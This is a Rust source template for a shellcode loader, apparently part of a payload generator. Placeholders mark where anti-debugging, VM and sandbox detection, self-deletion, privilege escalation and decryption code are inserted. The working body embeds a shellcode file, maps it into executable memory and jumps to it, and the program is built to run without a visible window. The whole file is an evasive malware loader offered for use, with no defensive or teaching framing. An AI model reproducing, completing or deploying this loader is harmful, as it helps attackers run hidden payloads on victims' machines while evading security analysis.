#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(unused_imports)]

use memmap2::MmapOptions;
use std::mem::transmute;

{{ENCRYPTION_IMPORTS}}
{{ANTIDEBUG_IMPORTS}}
{{VM_IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DEOBFUSCATION_IMPORTS}}

{{ANTIDEBUG_FUNCTION}}
{{VM_FUNCTION}}
{{SANDBOX_FUNCTION}}
{{DECRYPTION_FUNCTION}}
{{DEOBFUSCATION_FUNCTION}}

fn main() {

    {{SELF-DESTROY}}
    {{DEBUG_PRIVILEGE}}
    {{VM}}
    {{SANDBOX}}
    {{ANTIDEBUG}}

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }

    {{DEOBFUSCATION}}
    {{DECRYPTION}}

    let vec_size = vec.len();
    let mut mmap = MmapOptions::new()
        .len(vec_size)
        .map_anon()
        //.expect("[-] mmap failed!");
        .unwrap();
    mmap.copy_from_slice(vec.as_slice());
    let mmap = mmap.make_exec()
        //.expect("[-] make_exec failed!");
        .unwrap();
    unsafe {
        let shell: unsafe extern "C" fn() = transmute(mmap.as_ptr());
        shell();
    }
}

{{DLL_MAIN}}